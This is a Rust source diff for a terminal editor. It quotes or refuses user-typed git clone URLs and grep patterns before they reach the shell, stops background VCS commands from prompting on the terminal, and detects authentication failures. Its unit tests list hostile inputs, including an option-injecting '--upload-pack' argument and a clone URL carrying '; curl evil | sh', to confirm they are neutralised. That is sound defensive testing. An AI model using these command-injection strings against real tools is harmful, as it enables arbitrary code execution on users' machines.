@@ -2863,6 +2863,27 @@ impl App {
         format!("'{}'", s.replace('\'', "'\\''"))
     }
 
+    /// Quote one user-typed argument (a clone URL, a grep pattern) for the
+    /// shell that [`App::run_command_in`] hands the line to, or `None` when
+    /// it can't be made safe (T569). `allow_dash` is `false` for positional
+    /// arguments, where a leading `-` would be read as an option
+    /// (`--upload-pack=…`). POSIX gets single quotes; `cmd.exe` has no
+    /// reliable quoting, so a metacharacter there is refused outright.
+    fn vcs_shell_arg(s: &str, allow_dash: bool) -> Option<String> {
+        if s.is_empty() || s.chars().any(char::is_control) || (!allow_dash && s.starts_with('-')) {
+            return None;
+        }
+        if cfg!(windows) {
+            if s.chars()
+                .any(|c| "&|<>^\"%!()\r\n".contains(c) || c.is_whitespace())
+            {
+                return None;
+            }
+            return Some(s.to_string());
+        }
+        Some(Self::shell_single_quote(s))
+    }
+
     /// Dispatch a buffer-editing action (`edit.undo`/`redo`/`cut`/`copy`/
     /// `paste`/`toggle_comment`, the `edit.case_*` transforms, and the
     /// whole-line operations). Returns `true` if `action` was handled. Extracted
@@ -7361,9 +7382,28 @@ impl App {
                 self.apply_editorconfig_indent(path);
                 self.status = t!("status.opened", path = path.display()).to_string();
             }
-            Err(e) => self
-                .messages
-                .error(t!("msg.open_failed_path", path = path.display(), error = e).to_string()),
+            Err(e) => {
+                let reason = match crate::fileops::TextReadError::from_io(&e) {
+                    Some(crate::fileops::TextReadError::NotRegular) => {
+                        t!("msg.open_not_regular").to_string()
+                    }
+                    Some(crate::fileops::TextReadError::TooLarge) => {
+                        t!("msg.open_too_large").to_string()
+                    }
+                    Some(crate::fileops::TextReadError::Binary) => {
+                        t!("msg.open_binary").to_string()
+                    }
+                    None => e.to_string(),
+                };
+                self.messages.error(
+                    t!(
+                        "msg.open_failed_path",
+                        path = path.display(),
+                        error = reason
+                    )
+                    .to_string(),
+                );
+            }
         }
     }
 
@@ -13397,7 +13437,9 @@ impl App {
         // Explicitly closed rather than inherited: a background command has
         // no business reading from vix's own stdin (the terminal device vix
         // itself is reading raw input from) (T547).
-        let mut child = match shell_command(&script)
+        let mut command = shell_command(&script);
+        no_tty_prompts(&mut command);
+        let mut child = match command
             .current_dir(dir)
             .stdin(std::process::Stdio::null())
             .stdout(std::process::Stdio::piped())
@@ -13470,6 +13512,9 @@ impl App {
                 CmdMsg::Line(l) => {
                     if self.flags.contains(AppFlags::TEST_CAPTURE) {
                         self.test_buffer.push(l.clone());
+                    }
+                    if is_auth_failure_line(&l) {
+                        self.status = t!("status.vcs_auth_needed").to_string();
                     }
                     self.bottom_dock.push(l);
                 }
@@ -13756,6 +13801,43 @@ fn shell_command(script: &str) -> std::process::Command {
     cmd.arg("/C");
     cmd.raw_arg(script);
     cmd
+}
+
+/// Environment that stops a background VCS command (git, ssh, credential
+/// helpers) from prompting on `/dev/tty` over vix's raw-mode UI (T570).
+/// `GIT_SSH_COMMAND` is only added when the user hasn't chosen their own ssh.
+fn no_tty_prompt_env(user_ssh_set: bool) -> Vec<(&'static str, &'static str)> {
+    let mut env = vec![("GIT_TERMINAL_PROMPT", "0"), ("GCM_INTERACTIVE", "never")];
+    if !user_ssh_set {
+        env.push(("GIT_SSH_COMMAND", "ssh -o BatchMode=yes"));
+    }
+    env
+}
+
+/// Apply [`no_tty_prompt_env`] and, on Unix, a fresh process group so the
+/// child can't take terminal input (SIGTTIN) either.
+fn no_tty_prompts(cmd: &mut std::process::Command) {
+    let user_ssh_set =
+        std::env::var_os("GIT_SSH_COMMAND").is_some() || std::env::var_os("GIT_SSH").is_some();
+    for (k, v) in no_tty_prompt_env(user_ssh_set) {
+        cmd.env(k, v);
+    }
+    #[cfg(unix)]
+    {
+        use std::os::unix::process::CommandExt;
+        cmd.process_group(0);
+    }
+}
+
+/// Whether a command-output line is a VCS authentication failure that the
+/// no-prompt environment turned from a prompt into an error (T570).
+fn is_auth_failure_line(line: &str) -> bool {
+    let l = line.to_ascii_lowercase();
+    l.contains("terminal prompts disabled")
+        || l.contains("permission denied (publickey")
+        || l.contains("host key verification failed")
+        || l.contains("could not read username")
+        || l.contains("could not read password")
 }
 
 #[cfg(not(windows))]
@@ -14050,6 +14132,53 @@ mod tests {
     use super::*;
     use ratatui::Terminal;
     use ratatui::backend::TestBackend;
+
+    /// T570: background commands never prompt on the tty; a user's own ssh
+    /// command is left alone; auth failures are recognised.
+    #[test]
+    fn background_commands_get_no_prompt_environment() {
+        let env = no_tty_prompt_env(false);
+        assert!(env.contains(&("GIT_TERMINAL_PROMPT", "0")));
+        assert!(env.contains(&("GCM_INTERACTIVE", "never")));
+        assert!(env.iter().any(|(k, _)| *k == "GIT_SSH_COMMAND"));
+        assert!(
+            !no_tty_prompt_env(true)
+                .iter()
+                .any(|(k, _)| *k == "GIT_SSH_COMMAND")
+        );
+        assert!(is_auth_failure_line(
+            "fatal: could not read Username for 'https://x': terminal prompts disabled"
+        ));
+        assert!(is_auth_failure_line(
+            "git@x: Permission denied (publickey)."
+        ));
+        assert!(!is_auth_failure_line("Everything up-to-date"));
+    }
+
+    /// T569: hostile clone URLs / patterns are refused or quoted into one
+    /// shell word, never interpreted.
+    #[test]
+    fn vcs_shell_arg_refuses_options_and_quotes_metacharacters() {
+        assert_eq!(App::vcs_shell_arg("--upload-pack=touch x", false), None);
+        assert_eq!(App::vcs_shell_arg("-x", false), None);
+        assert_eq!(App::vcs_shell_arg("", false), None);
+        assert_eq!(App::vcs_shell_arg("a\nb", false), None);
+        // A pattern may legitimately start with `-` (the caller uses `-e`).
+        assert!(App::vcs_shell_arg("-foo", true).is_some());
+        if !cfg!(windows) {
+            for hostile in [
+                "https://x/r.git; curl evil | sh",
+                "$(id)",
+                "`id`",
+                "ext::sh -c id",
+                "it's",
+            ] {
+                let q = App::vcs_shell_arg(hostile, false).unwrap();
+                assert!(q.starts_with('\'') && q.ends_with('\''), "{q}");
+            }
+            assert_eq!(App::vcs_shell_arg("it's", false).unwrap(), "'it'\\''s'");
+        }
+    }
 
     /// Stacked modifier prefixes render as separate named words, in order,
     /// with the bare key uppercased (T104c's VS Code/`IntelliJ` display
